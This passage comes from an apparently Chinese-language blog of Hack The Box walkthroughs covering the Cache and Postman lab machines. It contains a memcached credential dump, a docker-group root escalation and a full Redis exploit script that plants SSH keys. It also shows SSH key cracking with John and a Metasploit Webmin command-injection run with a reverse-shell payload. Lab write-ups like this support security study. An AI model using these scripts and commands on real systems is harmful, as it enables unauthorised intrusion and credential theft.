<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@cache:/var/www$ su ash</span><br><span class="line">su ash</span><br><span class="line">Password: H@v3_fun</span><br><span class="line">ash@cache:/var/www$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(ash) gid=1000(ash) groups=1000(ash)</span><br><span class="line">ash@cache:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">93bf------------------------8dfe</span><br></pre></td></tr></table></figure>
<h4 id="memcached-exploit">memcached exploit</h4>
<p>查看本地运行服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ash@cache:~$ netstat -tulpn</span><br><span class="line">netstat -tulpn</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:11211         0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -                   </span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*                           -</span><br></pre></td></tr></table></figure>
<p>11211端口是运行memcached服务，利用方式：</p>
<blockquote>
<p><a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/">https://www.hackingarticles.in/penetration-testing-on-memcached-server/</a></p>
<p><a href="https://niiconsulting.com/checkmate/2013/05/memcache-exploit/">https://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a></p>
</blockquote>
<p>fetch the slab statistics：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ash@cache:~$ telnet 127.0.0.1 11211</span><br><span class="line">telnet 127.0.0.1 11211</span><br><span class="line">Trying 127.0.0.1...</span><br><span class="line">Connected to 127.0.0.1.</span><br><span class="line">Escape character is <span class="string">&#x27;^]&#x27;</span></span><br><span class="line">stats slabs</span><br><span class="line">stats slabs</span><br><span class="line">STAT 1:chunk_size 96</span><br><span class="line">STAT 1:chunks_per_page 10922</span><br><span class="line">STAT 1:total_pages 1</span><br><span class="line">STAT 1:total_chunks 10922</span><br><span class="line">STAT 1:used_chunks 5</span><br><span class="line">STAT 1:free_chunks 10917</span><br><span class="line">STAT 1:free_chunks_end 0</span><br><span class="line">STAT 1:mem_requested 371</span><br><span class="line">STAT 1:get_hits 1</span><br><span class="line">STAT 1:cmd_set 7730</span><br><span class="line">STAT 1:delete_hits 0</span><br><span class="line">STAT 1:incr_hits 0</span><br><span class="line">STAT 1:decr_hits 0</span><br><span class="line">STAT 1:cas_hits 0</span><br><span class="line">STAT 1:cas_badval 0</span><br><span class="line">STAT 1:touch_hits 0</span><br><span class="line">STAT active_slabs 1</span><br><span class="line">STAT total_malloced 1048576</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
<p>通过slab id查看组织结构items：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stats items</span><br><span class="line">stats items</span><br><span class="line">STAT items:1:number 5</span><br><span class="line">STAT items:1:number_hot 0</span><br><span class="line">STAT items:1:number_warm 0</span><br><span class="line">STAT items:1:number_cold 5</span><br><span class="line">STAT items:1:age_hot 0</span><br><span class="line">STAT items:1:age_warm 0</span><br><span class="line">STAT items:1:age 52</span><br><span class="line">STAT items:1:evicted 0</span><br><span class="line">STAT items:1:evicted_nonzero 0</span><br><span class="line">STAT items:1:evicted_time 0</span><br><span class="line">STAT items:1:outofmemory 0</span><br><span class="line">STAT items:1:tailrepairs 0</span><br><span class="line">STAT items:1:reclaimed 0</span><br><span class="line">STAT items:1:expired_unfetched 0</span><br><span class="line">STAT items:1:evicted_unfetched 0</span><br><span class="line">STAT items:1:evicted_active 0</span><br><span class="line">STAT items:1:crawler_reclaimed 0</span><br><span class="line">STAT items:1:crawler_items_checked 220</span><br><span class="line">STAT items:1:lrutail_reflocked 0</span><br><span class="line">STAT items:1:moves_to_cold 7735</span><br><span class="line">STAT items:1:moves_to_warm 0</span><br><span class="line">STAT items:1:moves_within_lru 0</span><br><span class="line">STAT items:1:direct_reclaims 0</span><br><span class="line">STAT items:1:hits_to_hot 0</span><br><span class="line">STAT items:1:hits_to_warm 0</span><br><span class="line">STAT items:1:hits_to_cold 1</span><br><span class="line">STAT items:1:hits_to_temp 0</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
<p>dump all the keys：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stats cachedump 1 0</span><br><span class="line">stats cachedump 1 0</span><br><span class="line">ITEM link [21 b; 0 s]</span><br><span class="line">ITEM user [5 b; 0 s]</span><br><span class="line">ITEM passwd [9 b; 0 s]</span><br><span class="line">ITEM file [7 b; 0 s]</span><br><span class="line">ITEM account [9 b; 0 s]</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
<p>读取<code>user</code>和<code>passwd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get user</span><br><span class="line">get user</span><br><span class="line">VALUE user 0 5</span><br><span class="line">luffy</span><br><span class="line">END</span><br><span class="line">get passwd</span><br><span class="line">get passwd</span><br><span class="line">VALUE passwd 0 9</span><br><span class="line">0n3_p1ec3</span><br><span class="line">END</span><br></pre></td></tr></table></figure>
<p>SSH登录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh luffy@10.10.10.188</span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.188 (10.10.10.188)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:/qQ34g2zzGVlmbMIKeD7JhlhDf/SPzgYFz000v+3KBI.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.188<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">luffy@10.10.10.188&#x27;</span>s password:</span><br><span class="line">luffy@cache:~$ id</span><br><span class="line">uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)</span><br></pre></td></tr></table></figure>
<p>观察到luffy是属于docker用户组。</p>
<h3 id="Getting-Root-Access">Getting Root Access</h3>
<p>GTFObins docker</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200528104211.png" style="zoom:80%;" />
<p>查看docker镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">luffy@cache:~$ docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">ubuntu              latest              2ca708c1c9cc        8 months ago        64.2MB</span><br></pre></td></tr></table></figure>
<p>照着GTFObins给的方法进行提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash</span><br><span class="line">root@2b2647044657:/<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@2b2647044657:/<span class="comment"># cd  </span></span><br><span class="line">root@2b2647044657:~<span class="comment"># cat root.txt</span></span><br><span class="line">32fc------------------------ceab</span><br></pre></td></tr></table></figure>
<h2 id="0x04-Reference">0x04 Reference</h2>
<table>
<thead>
<tr>
<th>Topic</th>
<th>Url</th>
</tr>
</thead>
<tbody>
<tr>
<td>OpenEmr Vulnerability ( video)</td>
<td><a href="https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s">https://www.youtube.com/watch?v=DJSQ8Pk_7hc&amp;t=73s</a></td>
</tr>
<tr>
<td>Memecache</td>
<td><a href="https://www.hackingarticles.in/penetration-testing-on-memcached-server/">https://www.hackingarticles.in/penetration-testing-on-memcached-server/</a></td>
</tr>
<tr>
<td>Memcacahe</td>
<td><a href="https://niiconsulting.com/checkmate/2013/05/memcache-exploit/">https://niiconsulting.com/checkmate/2013/05/memcache-exploit/</a></td>
</tr>
<tr>
<td>Docker</td>
<td><a href="https://gtfobins.github.io/gtfobins/docker/">https://gtfobins.github.io/gtfobins/docker/</a></td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>靶机</tag>
        <tag>HTB</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Postman Walkthrough</title>
    <url>/Target_drone/HackTheBox/2.HTB-Postman-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Postman-Walkthrough">HTB::Postman Walkthrough</h1>
<h2 id="0x01-靶机介绍">0x01 靶机介绍</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200210183311.png" alt=""></p>
<h2 id="0x02-使用工具和知识点">0x02 使用工具和知识点</h2>
<ul>
<li>nmap</li>
<li>redis server</li>
<li><a href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a></li>
<li><a href="http://ssh2john.py">ssh2john.py</a></li>
<li>John</li>
<li><a href="https://github.com/diego-treitos/linux-smart-enumeration#linux-smart-enumeration">lse.sh</a></li>
<li>webmin_packageup_rce</li>
</ul>
<h2 id="0x03-渗透过程">0x03 渗透过程</h2>
<p>扫描目标主机所有端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nmap -A -Pn -T4 -p- 10.10.10.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-09 23:18 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> postman.htb (10.10.10.160)</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">Not shown: 65531 filtered ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)</span><br><span class="line">|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)</span><br><span class="line">|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">&#x27;s Personal Website</span></span><br><span class="line"><span class="string">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="string">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_http-server-header: MiniServ/1.910</span></span><br><span class="line"><span class="string">|_http-trane-info: Problem with XML parsing of /evox/about</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
<p>主要来看一下80、6379和10000端口。</p>
<p>80端口：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200210140034.png" alt=""></p>
<p>6379端口：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200210140240.png" alt=""></p>
<p>10000端口：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200210140417.png" alt=""></p>
<p>通常80端口没有什么利用的东西，10000端口上运行Webmin服务尝试弱口令没有效果，而redis服务暴露在6379端口，可以从这里下手，Google<code>redis key store 4.0.9 expolit</code>，找到下面利用方式</p>
<p><a href="https://github.com/Avinash-acid/Redis-Server-Exploit">https://github.com/Avinash-acid/Redis-Server-Exploit</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#Author : Avinash Kumar Thapa aka -Acid</span></span><br><span class="line"><span class="comment">#Twitter : https://twitter.com/m_avinash143</span></span><br><span class="line"><span class="comment">#####################################################################################################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> termcolor <span class="keyword">import</span> colored</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">script, ip_address, username = argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PATH=<span class="string">&#x27;/usr/bin/redis-cli&#x27;</span></span><br><span class="line">PATH1=<span class="string">&#x27;/usr/local/bin/redis-cli&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_connection</span>():</span></span><br><span class="line">	shell = <span class="string">&quot;ssh -i &quot;</span> + <span class="string">&#x27;$HOME/.ssh/id_rsa &#x27;</span> + username+<span class="string">&quot;@&quot;</span>+ip_address</span><br><span class="line">	os.system(shell)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(PATH) <span class="keyword">or</span> os.path.isfile(PATH1):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">    		<span class="keyword">print</span> colored(<span class="string">&#x27;\t*******************************************************************&#x27;</span>, <span class="string">&quot;green&quot;</span>)</span><br><span class="line">    		<span class="keyword">print</span> colored(<span class="string">&#x27;\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*&#x27;</span> ,<span class="string">&quot;green&quot;</span>)</span><br><span class="line">    		<span class="keyword">print</span> colored(<span class="string">&#x27;\t* [+] AVINASH KUMAR THAPA aka &quot;-Acid&quot;                                &#x27;</span>, <span class="string">&quot;green&quot;</span>)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">&#x27;\t*******************************************************************&#x27;</span>, <span class="string">&quot;green&quot;</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">&quot;\n&quot;</span></span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">&quot;\t SSH Keys Need to be Generated&quot;</span>, <span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">		os.system(<span class="string">&#x27;ssh-keygen -t rsa -C \&quot;acid_creative\&quot;&#x27;</span>)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">&quot;\t Keys Generated Successfully&quot;</span>, <span class="string">&quot;blue&quot;</span>)</span><br><span class="line">		os.system(<span class="string">&quot;(echo &#x27;\r\n\&#x27;; cat $HOME/.ssh/id_rsa.pub; echo  \&#x27;\r\n\&#x27;) &gt; $HOME/.ssh/public_key.txt&quot;</span>)</span><br><span class="line">		cmd = <span class="string">&quot;redis-cli -h &quot;</span> + ip_address + <span class="string">&#x27; flushall&#x27;</span></span><br><span class="line">		cmd1 = <span class="string">&quot;redis-cli -h &quot;</span> + ip_address</span><br><span class="line">		os.system(cmd)</span><br><span class="line">		cmd2 = <span class="string">&quot;cat $HOME/.ssh/public_key.txt | redis-cli -h &quot;</span> +  ip_address + <span class="string">&#x27; -x set cracklist&#x27;</span></span><br><span class="line">		os.system(cmd2)</span><br><span class="line">		cmd3 = cmd1 + <span class="string">&#x27; config set dbfilename &quot;backup.db&quot; &#x27;</span></span><br><span class="line">		cmd4 = cmd1 + <span class="string">&#x27; config set  dir&#x27;</span> + <span class="string">&quot; /usr/lib/&quot;</span>+username+<span class="string">&quot;/.ssh/&quot;</span></span><br><span class="line">		cmd5 = cmd1 + <span class="string">&#x27; config set dbfilename &quot;authorized_keys&quot; &#x27;</span></span><br><span class="line">		cmd6 = cmd1 + <span class="string">&#x27; save&#x27;</span></span><br><span class="line">		os.system(cmd3)</span><br><span class="line">		os.system(cmd4)</span><br><span class="line">		os.system(cmd5)</span><br><span class="line">		os.system(cmd6)</span><br><span class="line">		<span class="keyword">print</span> colored(<span class="string">&quot;\tYou&#x27;ll get shell in sometime..Thanks for your patience&quot;</span>, <span class="string">&quot;green&quot;</span>)</span><br><span class="line">		ssh_connection()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">print</span> <span class="string">&quot;Something went wrong&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">print</span> colored(<span class="string">&quot;\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further.&quot;</span>, <span class="string">&quot;red&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>执行<code>python2 exp.py 10.10.10.160 redis</code>，SSH登录靶机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~/Desktop/HTB Scripts/Redis$ python2 exp.py 10.10.10.160 redis</span><br><span class="line">        *******************************************************************</span><br><span class="line">        * [+] [Exploit] Exploiting misconfigured REDIS SERVER*</span><br><span class="line">        * [+] AVINASH KUMAR THAPA aka <span class="string">&quot;-Acid&quot;</span>                                </span><br><span class="line">        *******************************************************************</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         SSH Keys Need to be Generated</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/home/kali/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /home/kali/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /home/kali/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:wMzHMZr3ew4dVP3cXrwsWg7JF7ay4peQHLplhK7BDww acid_creative</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 3072]----+</span></span><br><span class="line"><span class="string">|        o     .. |</span></span><br><span class="line"><span class="string">|     + + o   .  .|</span></span><br><span class="line"><span class="string">|      B =   .  oo|</span></span><br><span class="line"><span class="string">|   E   = + . o  *|</span></span><br><span class="line"><span class="string">|    + . S = + +.o|</span></span><br><span class="line"><span class="string">|     = o * B * o.|</span></span><br><span class="line"><span class="string">|      = + + % .  |</span></span><br><span class="line"><span class="string">|     . o . O .   |</span></span><br><span class="line"><span class="string">|        ..o .    |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">         Keys Generated Successfully</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">(error) ERR Changing directory: No such file or directory</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">        You&#x27;</span>ll get shell <span class="keyword">in</span> sometime..Thanks <span class="keyword">for</span> your patience</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Last login: Mon Feb 10 08:46:56 2020 from 10.10.15.125</span><br><span class="line">redis@Postman:~$ <span class="built_in">pwd</span></span><br><span class="line">/var/lib/redis</span><br></pre></td></tr></table></figure>
<p>直接查看<code>/etc/passwd</code>和<code>/home</code>目录，发现有一个Matt用户，而且user.txt权限也属于Matt。设法提升权限，<code>/opt</code>目录下有一个<code>id_rsa.bak</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<blockquote>
<p>还可以用LinEnum.sh来查找敏感文件：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200211201004.png" alt=""></p>
</blockquote>
<p>用ssh2john.py转换为John可识别的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~/Desktop$ /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash</span><br></pre></td></tr></table></figure>
<p>再用John来破解RSA密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali@kali:~/Desktop$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 2 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Note: This format may emit <span class="literal">false</span> positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">computer2008     (id_rsa)</span><br><span class="line">1g 0:00:00:35 DONE (2020-02-10 04:28) 0.02844g/s 408014p/s 408014c/s 408014C/sa6_123..*7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>切换为Matt用户，读取user.txt文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis@Postman:~$ su Matt</span><br><span class="line">Password: </span><br><span class="line">Matt@Postman:/var/lib/redis$ <span class="built_in">cd</span> /home/Matt/</span><br><span class="line">Matt@Postman:~$ cat user.txt </span><br><span class="line">517ad0ec2458ca97af8d93aac08a2f3c</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里不能用id_rsa私钥文件来登录靶机，每次登录成功后都会出现Connection close</p>
</blockquote>
<p>用lse.sh脚本查看root权限运行的进程，发现又在10000端口上的webmin，用<code>Matt</code>和<code>computer2008</code>可以成功登录，Google<code>webmin exploit</code>，exploit-db上有如下利用方式：</p>
<p><a href="https://www.exploit-db.com/exploits/46984">https://www.exploit-db.com/exploits/46984</a></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200210215936.png" alt=""></p>
<p>metasploit也收录这个漏洞。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD   computer2008     yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     10.10.10.160     yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">true</span>             no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME   Matt             yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.14.4       yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br><span class="line"></span><br><span class="line">msf5 exploit(linux/http/webmin_packageup_rce) &gt; exploit                         </span><br><span class="line">                                                                                </span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.113:4444                            </span><br><span class="line">[+] Session cookie: ba61f4eadcffcce039b166a29defa004                            </span><br><span class="line">[*] Attempting to execute the payload...                                        </span><br><span class="line">[*] Command shell session 1 opened (10.10.14.113:4444 -&gt; 10.10.10.160:46990) at </span><br><span class="line">2019-12-24 17:43:52 -0500                                                       </span><br><span class="line">cat /root/root.txt                                                              </span><br><span class="line">                                                                                </span><br><span class="line">a257741[-----------------]ddce</span><br></pre></td></tr></table></figure>
<p>大概看了一下Payload的利用，应该是Webmin在管理升级软件的时候造成了命令注入，执行了额外的用户命令，也可以直接使用Burp Suite发送Payload：</p>
